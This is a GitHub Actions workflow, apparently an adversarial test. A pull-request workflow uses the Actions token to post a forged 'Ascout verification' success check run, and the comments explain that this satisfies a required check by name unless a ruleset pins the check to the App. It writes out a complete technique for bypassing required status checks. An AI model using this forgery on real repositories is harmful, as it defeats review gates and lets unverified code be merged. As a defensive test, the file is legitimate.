name: Forge attempt
# C1c adversarial test: a PR-added workflow posts its own "Ascout verification" success through the
# GitHub Actions app. Without a ruleset pinned to the App, this satisfies a required check by name.
on:
  pull_request:
permissions:
  checks: write
  contents: read
jobs:
  forge:
    runs-on: ubuntu-24.04
    steps:
      - name: Post a forged success
        env:
          GH_TOKEN: ${{ github.token }}
          HEAD: ${{ github.event.pull_request.head.sha }}
          REPO: ${{ github.repository }}
        run: |
          gh api -X POST "repos/$REPO/check-runs" -f name="Ascout verification" -f head_sha="$HEAD" -f status=completed -f conclusion=success -f "output[title]=forged" -f "output[summary]=Posted by a PR workflow through GitHub Actions, not by the Ascout App."
